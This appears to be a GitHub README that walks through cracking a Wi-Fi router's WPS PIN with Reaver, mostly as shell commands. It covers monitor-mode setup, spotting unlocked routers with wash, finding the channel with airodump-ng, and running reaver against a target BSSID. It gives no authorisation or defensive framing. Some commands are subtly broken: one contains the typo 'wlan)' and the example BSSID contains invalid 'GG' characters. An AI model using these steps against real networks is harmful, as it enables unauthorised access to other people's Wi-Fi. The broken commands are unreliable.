# Cracking-Pin-with-Reaver

## Tools required
- Kali linux or any Linux OS
- Reaver
- Airodump
- wash

## Monitoring mode for Network Adaptor

- First kill the services that are interrupting for monitor mode .
```
airmon-ng check kill
```

- Now run the below commands to enable monitor mode.
```
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan) up
```

## Check if target wifi router Lock Disabled.

- We need to check whether the target wifi router lock is disabled so run the below command .
```
wash -i wlan0
```

![image](https://github.com/Kamalesh-Seervi/Cracking-Pin-with-Reaver/assets/107933310/e924f727-fe43-463a-a852-3d23348e71a8)

- We see that above lck for routers are `No` so we are good to go .

## Reaver 
- Now we use reaver tool to crack the pin.
- Before that we need to know the `channel` of the wifi network so run airodump to find it.
```
airodump-ng wlan0
```

- Now lets start the reaver type the below command.
```
reaver -b 90:F6:53:C4:GG:17 -i wlan0 -c 8 -vv
```
<img width="974" alt="image" src="https://github.com/Kamalesh-Seervi/Cracking-Pin-with-Reaver/assets/107933310/eec320fb-a950-4966-99f5-f063e97af69e">
